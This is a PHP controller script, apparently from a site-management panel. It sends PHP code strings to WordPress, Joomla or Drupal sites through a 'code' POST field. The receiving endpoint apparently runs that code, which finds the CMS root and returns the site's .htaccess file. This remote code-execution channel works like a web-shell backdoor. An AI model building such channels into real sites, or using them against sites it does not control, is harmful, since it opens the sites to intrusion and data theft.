<?php

if (!isset($_POST['domain_id'])) {
    print json_encode(array("result" => "internalerror"));
    return;
}

$TDomain = $application->compDriver($element->domainSource);
$domain = $TDomain->get($_POST['domain_id']);
$TDomain_integration = $application->compDriver($element->domainSource . "_integration");

if ($domain->type == 2) {
    // Drupal
    $message = '
    function findDir($dirName) {
        $dirh = opendir($dirName);
        if ($dirh) {
            while (($dirElement = readdir($dirh)) !== false) {
                if ($dirElement == "sites" && file_exists($dirName . "sites/default/settings.php")) {
                    closedir($dirh);
                    return $dirName;
                }
            }
            closedir($dirh);
            return findDir("$dirName../");
        }
        return "";
    }
    $dir = findDir("./");
    if (!$dir) {
	print json_encode(array("result"=>"nodir"));
	exit();
    }
    chdir($dir);
    $data = file_get_contents(".htaccess");
    if (!$data) {
        print json_encode(array("result" => "empty", "additionalData" => "", "data" => ""));
        return;
    }
    print json_encode(array("result" => "success", "data" => $data));
    return;
    ';
} else if ($domain->type == 1) {
    // Joomla
    $message = '
    function findDir($dirName) {
        $dirh = opendir($dirName);
        if ($dirh) {
            while (($dirElement = readdir($dirh)) !== false) {
                if ($dirElement == "includes" && file_exists($dirName . "includes/framework.php")) {
                    closedir($dirh);
                    return $dirName;
                }
            }
            closedir($dirh);
            return findDir("$dirName../");
        }
        return "";
    }
    $dir = findDir("./");
    if (!$dir) {
	print json_encode(array("result" => "nodir"));
	exit();
    }
    chdir($dir);
    $data = file_get_contents(".htaccess");
    if (!$data) {
        print json_encode(array("result" => "empty", "additionalData" => "", "data" => ""));
        return;
    }
    print json_encode(array("result" => "success", "data" => $data));
    return;
    ';
} else if ($domain->type == 0) {
    $message = '
    function findDir($dirName) {
        $dirh = opendir($dirName);
        if ($dirh) {
            while (($dirElement = readdir($dirh)) !== false) {
                if ($dirElement == "wp-load.php") {
                    closedir($dirh);
                    return $dirName;
                }
            }
            closedir($dirh);
            return findDir("$dirName../");
        }
        return "";
    }
    $dir = findDir("./");
    if (!$dir) {
	print json_encode(array("result" => "nodir"));
	exit();
    }
    chdir($dir);
    $data = file_get_contents(".htaccess");
    if (!$data) {
        print json_encode(array("result" => "empty", "additionalData" => "", "data" => ""));
        return;
    }
    print json_encode(array("result" => "success", "data" => $data));
    return;
    ';
}

$message = urlencode($message);
$message = trim($message);
$message = preg_replace("/\r|\n/", "", $message);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $domain->url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "code=$message");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$server_output = curl_exec($ch);
curl_close($ch);
if (!$server_output) {
    $TDomain->updateFields($domain->id, array("datetime" => "NOW()", "checkStatus" => "0"));
    $TDomain_integration->createByFields(array("parent_id" => $domain->id, "status" => "0", "datetime" => "NOW()"));
    print json_encode(array("result" => "noconnect"));
    return;
}
$obj = json_decode($server_output);
if (!isset($obj->result)) {
    $TDomain->updateFields($domain->id, array("datetime" => "NOW()", "checkStatus" => "1"));
    $TDomain_integration->createByFields(array("parent_id" => $domain->id, "status" => "1", "datetime" => "NOW()"));
    print json_encode(array("result" => "internalerror"));
    return;
}
if ($obj->result != "success") {
    $TDomain->updateFields($domain->id, array("datetime" => "NOW()", "checkStatus" => "2"));
    $TDomain_integration->createByFields(array("parent_id" => $domain->id, "status" => "2", "datetime" => "NOW()"));
    print json_encode(array("result" => $obj->result));
    return;
}
$TDomain->updateFields($domain->id, array("datetime" => "NOW()", "checkStatus" => "3"));
$id = $TDomain_integration->createByFields(array("parent_id" => $domain->id, "status" => "3", "datetime" => "NOW()"));

print json_encode(array("result" => "success", "data" => $obj->data));
